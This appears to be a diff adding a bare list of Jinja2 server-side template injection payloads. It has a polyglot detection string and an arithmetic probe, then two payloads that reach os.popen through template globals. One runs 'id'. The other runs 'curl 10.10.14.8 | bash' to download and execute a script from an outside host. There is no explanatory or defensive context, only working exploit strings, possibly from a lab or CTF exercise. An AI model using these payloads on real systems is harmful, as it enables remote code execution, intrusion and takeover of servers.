@@ -1,0 +1,15 @@
+${{<%[%'"}}%\.
+
+
+{{ 2 * 2 }}      
+
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.14.8 | bash').read() }}
+ 
+
+
+
